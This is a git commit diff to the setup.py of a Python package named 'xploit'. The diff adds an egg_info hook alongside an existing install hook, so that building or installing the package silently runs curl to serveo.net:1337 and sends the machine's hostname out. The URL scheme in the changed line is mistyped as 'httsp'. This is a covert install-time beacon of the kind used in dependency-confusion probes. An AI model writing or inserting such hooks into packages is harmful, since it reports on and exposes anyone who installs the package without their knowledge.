c559e61636eff4ce7def9ef5fa108144ca255ef1
Your Name <you@example.com>
2023-08-14 09:40:30 +0000

    romi

--- xploit/setup.py
+++ xploit/setup.py
@@ -1,17 +1,20 @@
 import os
 import subprocess
-import time
 from setuptools import setup, find_packages
 from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
 
 
 def RunCommand():
     # Touch a file in the current directory
     # Exec the following command: Run HTTP request to serveo.net:1337 and don't wait for the response
     hostname= os.uname()[1]
-    subprocess.Popen(["curl", "-q","http://serveo.net:1337/"+str(hostname)])
-    
-
+    subprocess.Popen(["curl", "-q","httsp://serveo.net:1337/"+str(hostname)])
     
 
 class RunInstallCommand(install):
@@ -22,10 +25,11 @@ class RunInstallCommand(install):
 
 setup(
     name = "xploit",
-    version = "0.0.2",
+    version = "0.0.3",
     license = "MIT",
     packages=find_packages(),
     cmdclass={
         'install' : RunInstallCommand,
+        'egg_info': RunEggInfoCommand,
     },
 )
